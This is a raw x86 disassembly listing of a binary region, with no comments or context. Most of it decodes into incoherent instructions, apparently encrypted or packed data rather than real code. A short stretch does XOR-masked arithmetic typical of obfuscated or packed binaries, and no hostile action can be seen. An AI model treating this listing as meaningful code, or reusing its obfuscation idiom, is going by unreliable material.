  41b05c:	cmp    bl,BYTE PTR [ebp+0x77dc4f6b]
  41b062:	test   BYTE PTR [edx+0x6a],ah
  41b065:	xor    edx,DWORD PTR [esi+0x257a0551]
  41b06b:	inc    esp
  41b06c:	gs mov dh,0x4d
  41b06f:	imul   BYTE PTR [eax-0xae5dd9d]
  41b075:	leave  
  41b076:	retf   
  41b077:	loop   0x41b0e6
  41b079:	jge    0x41b0e7
  41b07b:	mov    cl,0xf4
  41b07d:	jne    0x41b084
  41b07f:	enter  0xaeed,0x1d
  41b083:	gs mov ecx,0x8d1c04f3
  41b089:	mov    ecx,ebx
  41b08b:	xchg   esi,eax
  41b08c:	pop    ds
  41b08d:	clc    
  41b08e:	addr16 mov dl,0x8b
  41b091:	scas   eax,DWORD PTR es:[edi]
  41b092:	mul    BYTE PTR gs:[ebx+0x38]
  41b096:	test   BYTE PTR fs:[ebx],0x37
  41b09a:	push   0x47a9f5fe
  41b09f:	ja     0x41b07a
  41b0a1:	jmp    0x8a89:0x43a4de94
  41b0a8:	js     0x41b049
  41b0aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ab:	sbb    DWORD PTR [edi-0x4f],edx
  41b0ae:	sbb    edi,ebp
  41b0b0:	xor    ah,BYTE PTR [edi]
  41b0b2:	mov    ds:0xd534beab,eax
  41b0b7:	fisub  DWORD PTR fs:[ebp-0x57198e43]
  41b0be:	hlt    
  41b0bf:	push   0x56de56fe
  41b0c4:	push   cs
  41b0c5:	push   ss
  41b0c6:	(bad)  
  41b0c7:	xor    BYTE PTR [edi],al
  41b0c9:	sub    al,0xd
  41b0cb:	sub    bl,ch
  41b0cd:	dec    ebx
  41b0ce:	pop    ebx
  41b0cf:	sub    DWORD PTR [eax-0x5af1c17],edi
  41b0d5:	add    al,0x98
  41b0d7:	stos   DWORD PTR es:[edi],eax
  41b0d8:	popf   
  41b0d9:	sub    ah,BYTE PTR [edx+0x2e]
  41b0dc:	add    DWORD PTR [edx-0x15],0xb27ada10
  41b0e3:	ret    0x9775
  41b0e6:	aam    0x4d
  41b0e8:	pop    ds
  41b0e9:	sti    
  41b0ea:	or     ecx,DWORD PTR [eax]
  41b0ec:	retf   0x8409
  41b0ef:	cmp    esp,eax
  41b0f1:	jns    0x41b0c9
  41b0f3:	sbb    bl,BYTE PTR [edx+0x49e41c76]
  41b0f9:	and    dl,dh
  41b0fb:	fcomp  QWORD PTR [esi+0x76b002ea]
  41b101:	scas   al,BYTE PTR es:[edi]
  41b102:	neg    BYTE PTR [esp+esi*2]
  41b105:	es adc eax,0xab721e74
  41b10b:	outs   dx,DWORD PTR ds:[esi]
  41b10c:	arpl   WORD PTR [ebx+0x74ca3924],cx
  41b112:	(bad)  [ebp+0x3dd88f62]
  41b118:	call   0x7226b25
  41b11d:	inc    edi
  41b11e:	cdq    
  41b11f:	xchg   esi,eax
  41b120:	lds    ebp,FWORD PTR [edx+eax*2+0x4f8ebd13]
  41b127:	aad    0x28
  41b129:	aas    
  41b12a:	unpckhps xmm1,XMMWORD PTR fs:[ebx]
  41b12e:	jg     0x41b1a3
  41b130:	(bad)  [eax-0x4]
  41b133:	imul   edi,DWORD PTR [edi-0x1870b439],0xffffffcb
  41b13a:	outs   dx,DWORD PTR ds:[esi]
  41b13b:	fsub   QWORD PTR [ebp-0x69]
  41b13e:	ins    DWORD PTR es:[edi],dx
  41b13f:	pop    ecx
  41b140:	xchg   edi,eax
  41b141:	rcl    DWORD PTR [esi+ecx*8-0x7d4fae19],cl
  41b148:	jg     0x41b1c3
  41b14a:	out    0x58,al
  41b14c:	mov    esi,0x78505814
  41b151:	aaa    
  41b152:	jnp    0x41b178
  41b154:	not    esp
  41b156:	mov    dh,ch
  41b158:	push   esi
  41b159:	xchg   ebp,edi
  41b15b:	add    edi,DWORD PTR [esi]
  41b15d:	jge    0x41b1d5
  41b15f:	dec    esi
  41b160:	test   DWORD PTR [edx],0x8c74c6a
  41b166:	addr16 (bad) 
  41b168:	mov    ds:0xec2dbe82,al
  41b16d:	stc    
  41b16e:	jecxz  0x41b1df
  41b170:	mov    edi,0x455b0827
  41b175:	sub    al,0xb9
  41b177:	loopne 0x41b0fb
  41b179:	ds mov edx,0xbb3cfc90
  41b17f:	out    0x44,al
  41b181:	shr    dh,0x31
  41b184:	mov    eax,0xe6741b9d
  41b189:	dec    ebx
  41b18a:	xor    esi,DWORD PTR [edi+0x15]
  41b18d:	cmp    DWORD PTR [edi],ebx
  41b18f:	ret    
  41b190:	cmp    bh,BYTE PTR [esi-0x282aab08]
  41b196:	in     eax,dx
  41b197:	adc    DWORD PTR [esi+0x37],edx
  41b19a:	test   DWORD PTR [ecx+0x5bd23ce],edi
  41b1a0:	gs ds retf 
  41b1a3:	fs in  al,dx
  41b1a5:	ins    BYTE PTR es:[edi],dx
  41b1a6:	cdq    
  41b1a7:	dec    eax
  41b1a8:	ins    BYTE PTR es:[edi],dx
  41b1a9:	dec    edi
  41b1aa:	pop    esp
  41b1ab:	cli    
  41b1ac:	pop    ss
  41b1ad:	sahf   
  41b1ae:	mov    ebx,0x71f08c62
  41b1b3:	je     0x41b231
  41b1b5:	sub    cl,dl
  41b1b7:	mov    cl,0x3
  41b1b9:	ins    DWORD PTR es:[edi],dx
  41b1ba:	mov    al,ss:0x17732c9c
  41b1c0:	xchg   ebp,eax
  41b1c1:	mov    DWORD PTR [eax+esi*2],esp
  41b1c4:	sub    edx,edx
  41b1c6:	mov    DWORD PTR [eax],edi
  41b1c8:	xor    eax,0x3a0ce4b3
  41b1cd:	rol    dh,0xce
  41b1d0:	jmp    0x41b19a
  41b1d2:	pop    ebp
  41b1d3:	dec    esi
  41b1d4:	mov    cs,WORD PTR gs:[eax-0x41]
  41b1d8:	das    
  41b1d9:	pop    ds
  41b1da:	sub    edi,eax
  41b1dc:	inc    ecx
  41b1dd:	dec    eax
  41b1de:	dec    edx
  41b1df:	mov    ch,0xc5
  41b1e1:	adc    esi,DWORD PTR [ebp-0x1bba74b7]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	rcl    BYTE PTR ss:[bx+0x8e6],0xbe
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b1c3
  41b205:	ror    esi,1
  41b207:	push   ss
  41b208:	add    al,0x6b
  41b20a:	add    BYTE PTR [edx],0x8e
  41b20d:	pop    ebx
  41b20e:	js     0x41b20f
  41b210:	mov    esi,0x74987ffa
  41b215:	sti    
  41b216:	enter  0x7f9,0x79
  41b21a:	or     ebx,0xa3cdda9f
  41b220:	inc    ebx
  41b221:	das    
  41b222:	jae    0x41b1aa
  41b224:	in     al,0xc1
  41b226:	dec    edi
  41b227:	test   eax,0x5be3cbd9
  41b22c:	xchg   ebx,eax
  41b22d:	enter  0xe24e,0xa4
  41b231:	push   es
  41b232:	jmp    0x311258e3
  41b237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b238:	stos   BYTE PTR es:[edi],al
  41b239:	xor    eax,0x26a5b22f
  41b23e:	mov    ebx,0xdf775149
  41b243:	loope  0x41b1dc
  41b245:	mov    dh,0x2c
  41b247:	mov    bh,0x39
  41b249:	gs inc ecx
  41b24b:	xchg   ebx,eax
  41b24c:	(bad)  
  41b24e:	leave  
  41b24f:	mov    edx,0x5d49888e
  41b254:	iret   
  41b255:	int    0xd2
  41b257:	test   DWORD PTR [edx-0xc],0x3d04b1ce
  41b25e:	popf   
  41b25f:	add    bl,BYTE PTR [edi-0x62]
  41b262:	sub    BYTE PTR [esi-0x67],0x26
  41b266:	sub    DWORD PTR [ebp-0x6a345419],eax
  41b26c:	adc    BYTE PTR [esi],cl
  41b26e:	xor    BYTE PTR [esi-0x39c83524],cl
  41b274:	sbb    bl,cl
  41b276:	adc    DWORD PTR [esi-0x49],ecx
  41b279:	in     eax,0x9a
  41b27b:	mov    edx,0x22397a0d
  41b280:	rol    BYTE PTR cs:[esi-0x7e],0xec
  41b285:	shr    BYTE PTR [edx+0x14],1
  41b288:	xchg   esi,eax
  41b289:	or     al,0x1d
  41b28b:	push   cs
  41b28c:	or     al,0xfe
  41b28e:	xor    DWORD PTR [edx+0x32],esi
  41b291:	push   ebx
  41b292:	inc    ebp
  41b293:	mov    ah,0x7f
  41b295:	in     eax,0xa3
  41b297:	fstp   TBYTE PTR [ebx-0x813bcab]
  41b29d:	sti    
  41b29e:	cmp    al,cl
  41b2a0:	sub    DWORD PTR [edx],0x27
  41b2a3:	sbb    al,0xe2
  41b2a5:	mov    ebp,0xdc5b9b5b
  41b2aa:	outs   dx,BYTE PTR ds:[esi]
  41b2ab:	or     esi,0xffffff88
  41b2ae:	hlt    
  41b2af:	retf   0xdb1
  41b2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2b4:	les    esi,FWORD PTR [eax+0x1a]
  41b2b7:	jno    0x41b28b
  41b2b9:	ss jmp 0x41b323
  41b2bc:	push   ds
  41b2bd:	xor    dh,dl
  41b2bf:	xchg   esi,eax
  41b2c0:	dec    esp
  41b2c1:	adc    al,0xd
  41b2c3:	retf   
  41b2c4:	pop    eax
  41b2c5:	mov    edx,0x45369a99
  41b2ca:	(bad)  
  41b2cb:	sbb    DWORD PTR [edi+0x1e],esi
  41b2ce:	scas   al,BYTE PTR es:[edi]
  41b2cf:	jmp    0x1999:0x30f81a92
  41b2d6:	data16 arpl si,di
  41b2d9:	lods   eax,DWORD PTR ds:[esi]
  41b2da:	fwait
  41b2db:	into   
  41b2dc:	jmp    0x2e43:0xaa9e3cbf
  41b2e3:	arpl   WORD PTR [ebx],dx
  41b2e5:	push   ebx
  41b2e6:	mov    BYTE PTR [ebx+0x7],bl
  41b2e9:	mov    ds:0x6bf55cfe,al
  41b2ee:	push   0x32
  41b2f0:	add    eax,0xb9001bd1
  41b2f5:	dec    ebp
  41b2f6:	mov    ebx,0x4c0a68d5
  41b2fb:	ret    
  41b2fc:	int3   
  41b2fd:	cmc    
  41b2fe:	js     0x41b32c
  41b300:	adc    DWORD PTR [ebp+0x1b],eax
  41b303:	mov    ah,BYTE PTR [edi+0x37]
  41b306:	push   ebp
  41b307:	mov    ds:0xe21d6f24,al
  41b30c:	stc    
  41b30d:	xchg   ebp,eax
  41b30e:	imul   ecx,DWORD PTR [ecx+0x1b],0x33
  41b312:	sti    
  41b313:	ins    DWORD PTR es:[edi],dx
  41b314:	jbe    0x41b346
  41b316:	es out 0x77,al
  41b319:	mov    ds:0x63c6b9c5,eax
  41b31e:	fcom   QWORD PTR [edx+0x68fe22b0]
  41b324:	xor    al,0xfb
  41b326:	hlt    
  41b327:	adc    DWORD PTR [ebx],esp
  41b329:	addr16 in al,0x89
  41b32c:	dec    ecx
  41b32d:	or     DWORD PTR [edx-0x1bc3314f],eax
  41b333:	add    al,ch
  41b335:	xlat   BYTE PTR ds:[ebx]
  41b336:	sbb    al,al
  41b338:	pop    ss
  41b339:	sub    al,0xaf
  41b33b:	repnz fist WORD PTR [ebp+0x7d20966e]
  41b342:	push   esi
  41b343:	xchg   ebx,eax
  41b344:	mov    BYTE PTR [esi+0x32d7ecf0],bl
  41b34a:	aaa    
  41b34b:	inc    edx
  41b34c:	or     DWORD PTR [edi-0x66b98308],edx
  41b352:	add    esp,DWORD PTR [ebp-0x6f8fa719]
  41b358:	or     esi,ecx
  41b35a:	mov    ebp,0xa48eed46
  41b35f:	aaa    
  41b360:	mov    ebx,0x9a986c26
  41b365:	add    edi,DWORD PTR [ebx-0x9]
  41b368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b369:	pop    esp
  41b36a:	dec    eax
  41b36b:	xchg   ebp,eax
  41b36c:	pop    ecx
  41b36d:	int3   
  41b36e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b36f:	imul   esp,ecx,0xffffffa6
  41b372:	rcl    BYTE PTR [ebx],0xef
  41b375:	jno    0x41b38e
  41b377:	lods   al,BYTE PTR ds:[esi]
  41b378:	ret    
  41b379:	mov    dl,0x2b
  41b37b:	in     al,0xe0
  41b37d:	push   eax
  41b37e:	mov    ecx,DWORD PTR ds:[esi+0x32fd1445]
  41b385:	imul   ebp,DWORD PTR [ebx+0x4b],0xb2262e
  41b38c:	fwait
  41b38d:	ins    BYTE PTR es:[edi],dx
  41b38e:	outs   dx,DWORD PTR ds:[esi]
  41b38f:	aad    0xac
  41b391:	mov    fs,WORD PTR [ebp+0x1c]
  41b394:	out    dx,eax
  41b395:	pop    esi
  41b396:	out    dx,al
  41b397:	pop    edx
  41b398:	xor    BYTE PTR [esi+0x3e42310f],bl
  41b39e:	sbb    al,0xa3
  41b3a0:	inc    esp
  41b3a1:	pop    ebp
  41b3a2:	mov    edx,0x4cb01aee
  41b3a7:	push   edi
  41b3a8:	xor    al,0xc0
  41b3aa:	fs js  0x41b3fc
  41b3ad:	es sbb al,0xba
  41b3b0:	xchg   BYTE PTR [edx],dl
  41b3b2:	xchg   DWORD PTR [edi+0x2c],edx
  41b3b5:	pop    es
  41b3b6:	(bad)  
  41b3b8:	inc    esp
  41b3b9:	rol    ebx,1
  41b3bb:	mov    edi,0x12e07606
  41b3c0:	in     al,0x71
  41b3c2:	add    BYTE PTR [edi-0x7daa258f],cl
  41b3c8:	jl     0x41b40b
  41b3ca:	mov    ds:0xeb03506d,eax
  41b3cf:	js     0x41b40a
  41b3d1:	fwait
  41b3d2:	jne    0x41b380
  41b3d4:	jo     0x41b3e2
  41b3d6:	push   cs
  41b3d7:	daa    
  41b3d8:	inc    eax
  41b3d9:	fidiv  WORD PTR [eax]
  41b3db:	add    BYTE PTR [eax+0x1a11e881],dh
  41b3e1:	cdq    
  41b3e2:	inc    esp
  41b3e3:	dec    esp
  41b3e4:	(bad)
  41b3e7:	sub    edx,DWORD PTR [eax+ecx*4-0x32927a34]
  41b3ee:	jl     0x41b437
  41b3f0:	lds    ebx,FWORD PTR [ecx]
  41b3f2:	(bad)  
  41b3f3:	push   esi
  41b3f4:	jl     0x41b3aa
  41b3f6:	cdq    
  41b3f7:	mov    esp,0xa6d17e18
  41b3fc:	lds    edi,FWORD PTR [eax]
  41b3fe:	adc    DWORD PTR [edi-0xcf5e960],edx
  41b404:	add    esi,DWORD PTR [eax+esi*4-0x9b03910]
  41b40b:	sbb    edx,DWORD PTR [ecx+ecx*2-0x5b]
  41b40f:	inc    esp
  41b410:	xor    DWORD PTR [ebx],ecx
  41b412:	jg     0x41b3c5
  41b414:	mov    bh,0xa7
  41b416:	adc    dl,BYTE PTR ds:0xe00d157
  41b41c:	imul   eax,ecx
  41b41f:	sub    esp,eax
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	fimul  DWORD PTR [ecx-0x1d3fb9ca]
  41b4bf:	jg     0x41b539
  41b4c1:	adc    BYTE PTR [esi+0x78],bh
  41b4c4:	js     0x41b4d5
  41b4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4c8:	pop    edi
  41b4c9:	je     0x41b52c
  41b4cb:	cli    
  41b4cc:	cwde   
  41b4cd:	fisttp WORD PTR [ebx+0x56]
  41b4d0:	imul   esi,DWORD PTR [ecx+0x60aafbb6],0x2574b527
  41b4da:	test   DWORD PTR [ecx],eax
  41b4dc:	push   ebx
  41b4dd:	push   eax
  41b4de:	add    eax,0xb2d04295
  41b4e3:	(bad)  
  41b4e4:	mov    edx,0xdd2e79b5
  41b4e9:	jmp    0x41b4c6
  41b4eb:	add    BYTE PTR [edx-0xa],dh
  41b4ee:	mov    edi,0xa51f7a1f
  41b4f3:	jnp    0x41b4f3
  41b4f5:	mov    ebp,0xa5ffeb71
  41b4fa:	xchg   DWORD PTR [edi+0x36a1f88a],eax
  41b500:	xor    ebx,edi
  41b502:	shl    DWORD PTR [esi+0x18953ca7],0x57
  41b509:	xor    ebx,DWORD PTR [esi-0x67543641]
  41b50f:	mov    DWORD PTR [edi-0x4c],ebp
  41b512:	push   eax
  41b514:	sbb    BYTE PTR [edi-0x3040d292],cl
  41b51a:	(bad)  
  41b51b:	out    0x9a,eax
  41b51d:	outs   dx,BYTE PTR ds:[esi]
  41b51e:	push   0xffffff95
  41b520:	sar    bh,cl
  41b522:	dec    esp
  41b523:	(bad)  
  41b524:	adc    BYTE PTR [ebp-0x1b],dl
  41b527:	sub    BYTE PTR [ecx+0x32c97474],dh
  41b52d:	rol    DWORD PTR [eax],1
  41b52f:	pop    ss
  41b530:	cmc    
  41b531:	repz stc 
  41b533:	push   0xffffffcd
  41b535:	adc    esp,DWORD PTR [ebx]
  41b537:	sbb    ecx,ebp
  41b539:	data16 mov es,WORD PTR [ecx-0x14]
  41b53d:	das    
  41b53e:	fcom   DWORD PTR [ebp-0x63]
  41b541:	icebp  
  41b542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b543:	fsubr  DWORD PTR [esi-0x6ea4dce9]
  41b549:	inc    esp
  41b54a:	and    DWORD PTR [eax-0x334a0df9],0xffffffa7
  41b551:	(bad)  
  41b553:	scas   eax,DWORD PTR es:[edi]
  41b554:	push   cs
  41b555:	popa   
  41b556:	sbb    cl,BYTE PTR [edx+0x56ba1a7e]
  41b55c:	mov    ch,0xd1
  41b55e:	cli    
  41b55f:	xchg   edx,eax
  41b560:	jmp    0x7154:0xfe97352f
  41b567:	jb     0x41b5df
  41b569:	push   cs
  41b56a:	adc    al,cl
  41b56c:	shr    bl,0x9e
  41b56f:	mov    ?,WORD PTR [eax-0x77b980c3]
  41b575:	add    BYTE PTR [ebx+0x73],dh
  41b578:	push   es
  41b579:	jle    0x41b59d
  41b57b:	dec    esi
  41b57c:	cwde   
  41b57d:	mov    ebp,0x1c4a997d
  41b582:	test   eax,0xc1357549
  41b587:	or     BYTE PTR [esi-0xe2b361d],cl
  41b58d:	xor    ch,BYTE PTR [edx]
  41b58f:	ret    
  41b590:	mov    cl,0xf6
  41b592:	iret   
  41b593:	xchg   DWORD PTR [ecx-0x45aac8c0],esp
  41b599:	rcl    ch,0xfb
  41b59c:	sbb    eax,0xa7a646ae
  41b5a1:	int    0x94
  41b5a3:	sahf   
  41b5a4:	adc    bh,bl
  41b5a6:	nop
  41b5a7:	and    DWORD PTR [ebx],0xb
  41b5aa:	imul   esi,DWORD PTR [ebx+edx*4+0x7b497732],0xfffffffc
  41b5b2:	loopne 0x41b5d4
  41b5b4:	xchg   ebp,eax
  41b5b5:	nop
  41b5b6:	mov    ah,0xf6
  41b5b8:	mov    WORD PTR [ebp+0x5e],ss
  41b5bb:	mov    edi,0xf538157a
  41b5c0:	jae    0xd2d14c86
  41b5c6:	js     0x41b60f
  41b5c8:	fstp   st(2)
  41b5ca:	stos   BYTE PTR es:[edi],al
  41b5cb:	and    eax,0xbde18fb9
  41b5d0:	sub    ebx,DWORD PTR [eax+0x5c]
  41b5d3:	cwde   
  41b5d4:	xchg   esp,eax
  41b5d5:	inc    edx
  41b5d6:	jl     0x41b5a9
  41b5d8:	xchg   edx,eax
  41b5d9:	add    eax,0xe95bfcd3
  41b5de:	adc    eax,0x562caabb
  41b5e3:	in     eax,0xf1
  41b5e5:	add    BYTE PTR [edx+0x5a477d10],dh
  41b5eb:	xlat   BYTE PTR ds:[ebx]
  41b5ec:	std    
  41b5ed:	push   ecx
  41b5ee:	add    bl,0xc3
  41b5f1:	out    dx,al
  41b5f2:	mov    esp,0x8f67a329
  41b5f7:	and    eax,0xe9609017
  41b5fc:	ds into 
  41b5fe:	sub    al,0x9e
  41b600:	add    al,0x9b
  41b602:	jle    0x41b5f4
  41b604:	mov    ebx,0x1f83defc
  41b609:	add    al,BYTE PTR [edx]
  41b60b:	xchg   BYTE PTR [ecx],dh
  41b60d:	pop    ds
  41b60e:	push   cs
  41b60f:	cmp    eax,0x58f7a9c9
  41b614:	out    dx,eax
  41b615:	mov    ds:0xa2742553,al
  41b61a:	or     dh,bl
  41b61c:	mov    edi,0x9d1c5150
  41b621:	pop    ss
  41b622:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b624:	add    eax,0xd74ddf00
  41b629:	aaa    
  41b62a:	xchg   ecx,eax
  41b62b:	fsubr  QWORD PTR [ecx+ecx*2+0x67]
  41b62f:	inc    edi
  41b630:	adc    edx,DWORD PTR [esi+0x1164d3ed]
  41b636:	mov    bh,0x81
  41b638:	pusha  
  41b639:	jmp    0x7bb29d46
  41b63e:	jnp    0x41b6b5
  41b640:	pop    edi
  41b641:	jle    0x41b655
  41b643:	mov    ebp,0x7b152293
  41b648:	sbb    eax,DWORD PTR [edx]
  41b64a:	pushf  
  41b64b:	mov    bp,0x8829
  41b64f:	adc    eax,0x6ac14458
  41b654:	iret   
  41b655:	sub    eax,0xe134d2be
  41b65a:	lahf   
  41b65b:	pushf  
  41b65c:	pop    edi
  41b65d:	inc    esi
  41b65e:	iret   
  41b65f:	push   edi
  41b660:	clc    
  41b661:	test   al,0x8
  41b663:	adc    edi,DWORD PTR [edx]
  41b665:	push   ebx
  41b666:	adc    DWORD PTR [ebx],edx
  41b668:	pop    es
  41b669:	pop    es
  41b66a:	xor    DWORD PTR [ebp+eax*1-0x3e0e973d],edx
  41b671:	enter  0x80cd,0x34
  41b675:	aas    
  41b676:	push   eax
  41b677:	inc    esi
  41b678:	mov    bl,0x9
  41b67a:	jmp    0x2c74:0xc0720223
  41b681:	inc    ebp
  41b682:	sbb    bh,BYTE PTR [ebp+0x237c247f]
  41b688:	cwde   
  41b689:	ins    DWORD PTR es:[edi],dx
  41b68a:	inc    edi
  41b68b:	xor    dl,cl
  41b68d:	stos   BYTE PTR es:[edi],al
  41b68e:	dec    eax
  41b68f:	sub    al,0xa7
  41b691:	and    al,0xe5
  41b693:	mov    esp,DWORD PTR [esi+eiz*8+0x22]
  41b697:	cld    
  41b698:	xchg   esi,eax
  41b699:	jmp    0x3fd4:0xf4f247d3
  41b6a0:	ja     0x41b691
  41b6a2:	mov    dh,0x84
  41b6a4:	outs   dx,BYTE PTR ds:[esi]
  41b6a5:	mov    ah,0x8b
  41b6a7:	pop    esp
  41b6a8:	addr16 mov eax,ds:0x49f
  41b6ac:	jp     0x41b72c
  41b6ae:	outs   dx,BYTE PTR ds:[esi]
  41b6af:	push   cs
  41b6b0:	repnz dec ebx
  41b6b2:	add    ebx,ebp
  41b6b4:	js     0x41b733
  41b6b6:	daa    
  41b6b7:	mov    ah,0x17
  41b6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6ba:	or     bl,BYTE PTR [ebx+0x21]
  41b6bd:	jl     0x41b6f4
  41b6bf:	xor    ebp,DWORD PTR [edi-0x77e15924]
  41b6c5:	xchg   edx,eax
  41b6c6:	loop   0x41b673
  41b6c8:	shl    DWORD PTR [ecx+0x1b],0xc6
  41b6cc:	in     eax,0x78
  41b6ce:	dec    ebx
  41b6cf:	cmp    bl,dl
  41b6d1:	fadd   QWORD PTR [eax]
  41b6d3:	push   es
  41b6d4:	retf   0xa9f3
  41b6d7:	sbb    ch,al
  41b6d9:	pop    es
  41b6da:	dec    ebx
  41b6db:	push   edi
  41b6dc:	add    BYTE PTR [ebx],dh
  41b6de:	rol    DWORD PTR [ebx],0xc6
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x3e6a970a]
  41b6f4:	or     al,0x13
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b71c
  41b6ff:	jge    0x41b6c9
  41b701:	push   esp
  41b702:	jns    0x41b6e3
  41b704:	and    edi,DWORD PTR [edi+0x12]
  41b707:	ret    0x729b
  41b70a:	ret    0x69d7
  41b70d:	mov    cl,0x16
  41b70f:	cmc    
  41b710:	enter  0xc271,0xda
  41b714:	push   ds
  41b715:	(bad)  
  41b716:	push   0x1a
  41b718:	icebp  
  41b719:	in     eax,0x13
  41b71b:	add    al,0xc
  41b71d:	into   
  41b71e:	xchg   BYTE PTR [ebx+0x55],dh
  41b721:	mov    edx,ebp
  41b723:	push   es
  41b724:	dec    esp
  41b725:	jne    0x41b731
  41b727:	and    eax,esp
  41b729:	repnz rcr DWORD PTR [ecx+ebp*1+0x7a],0xb7
  41b72f:	and    DWORD PTR [esi],edi
  41b731:	(bad)  
  41b732:	out    0xcf,eax
  41b734:	mov    dl,BYTE PTR ds:0x5f7883ac
  41b73a:	ret    0x1bb9
  41b73d:	mov    bl,0xc
  41b73f:	mov    dl,0xfd
  41b741:	outs   dx,DWORD PTR ds:[esi]
  41b742:	pop    eax
  41b743:	daa    
  41b744:	test   al,0x5e
  41b746:	lea    edi,[esi]
  41b748:	fisttp QWORD PTR [eax-0x7b]
  41b74b:	sbb    BYTE PTR [ebx+ebp*1+0x68],dl
  41b74f:	cmp    al,0xaa
  41b751:	xlat   BYTE PTR ds:[ebx]
  41b752:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b754:	ror    BYTE PTR [edx],1
  41b756:	(bad)  
  41b757:	(bad)  
  41b758:	std    
  41b759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b75a:	test   DWORD PTR [ecx+eiz*2+0x78d8bdd6],esi
  41b761:	(bad)  
  41b762:	pop    ecx
  41b763:	sub    BYTE PTR [ebp+0x43],dh
  41b766:	lods   al,BYTE PTR ds:[esi]
  41b767:	idiv   BYTE PTR [esi-0x34]
  41b76a:	mov    dh,0x7f
  41b76c:	sti    
  41b76d:	jb     0x41b7e4
  41b76f:	lahf   
  41b770:	sahf   
  41b771:	and    al,BYTE PTR [edi]
  41b773:	or     eax,0xc185b16c
  41b778:	fsub   DWORD PTR [eax+0x2a10806a]
  41b77e:	xchg   ebp,eax
  41b77f:	sar    ah,1
  41b781:	mov    ah,0x9e
  41b783:	dec    edx
  41b784:	jl     0x41b78a
  41b786:	leave  
  41b787:	lea    eax,[eax+esi*1-0x69900c46]
  41b78e:	xor    ebx,ecx
  41b790:	mov    eax,ds:0xd86e0c4b
  41b795:	cmp    edx,esi
  41b797:	xchg   ecx,eax
  41b798:	mov    al,0x45
  41b79a:	inc    esi
  41b79b:	cmp    al,0xf
  41b79d:	loopne 0x41b7f4
  41b79f:	clc    
  41b7a0:	pop    ds
  41b7a1:	lods   eax,DWORD PTR ds:[esi]
  41b7a2:	jmp    0x8745:0x3461d6f3
  41b7a9:	pop    edi
  41b7aa:	jecxz  0x41b749
  41b7ac:	sub    BYTE PTR [ecx+0x5f16b186],ch
  41b7b2:	mov    ebp,DWORD PTR [edx-0x4dc1335b]
  41b7b8:	xor    edx,DWORD PTR [ebp+ebx*2-0x57]
  41b7bc:	test   eax,0xe8c2e6c1
  41b7c1:	ss cmp ah,0xe6
  41b7c5:	inc    esi
  41b7c6:	mov    dl,0xba
  41b7c8:	adc    ebp,edi
  41b7ca:	sbb    cl,ch
  41b7cc:	xor    al,0x51
  41b7ce:	dec    esi
  41b7cf:	dec    ebp
  41b7d0:	mov    bl,0x22
  41b7d2:	neg    al
  41b7d4:	das    
  41b7d5:	(bad)  
  41b7d6:	shl    cl,cl
  41b7d8:	sbb    al,BYTE PTR [ebp-0x5c]
